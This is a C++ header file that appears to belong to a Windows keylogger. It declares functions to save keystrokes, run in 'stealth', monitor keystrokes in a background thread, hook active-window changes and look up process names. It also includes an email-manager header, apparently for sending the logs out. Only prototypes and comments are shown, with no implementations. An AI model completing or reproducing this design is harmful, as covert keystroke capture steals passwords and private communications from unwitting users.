#include <windows.h>
#include <tlhelp32.h>
#include <ctime>
#include <iostream>
#include <string>
#include <stdio.h>
#include "..\data_manager\DataManager.h"
#include "..\data_manager\Entry.h"
#include "..\email_manager\EmailManager.h"
using namespace std;



struct timeStruct {
    time_t rawtime;
    string str;
};

void save(int key_stroke);

void stealth();

string GetProcessName(DWORD dwPID);

timeStruct getTime();

// function to pause for specified amount of seconds
void pause(int dur);

// thread used to monitor keystrokes
DWORD WINAPI mythread(LPVOID lpParameter);

// function triggered whenever a window becomes active
void HandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime);

// function to start active window listener
void getWindows();

// initialize keylog thread and event hook for active window monitoring
void init();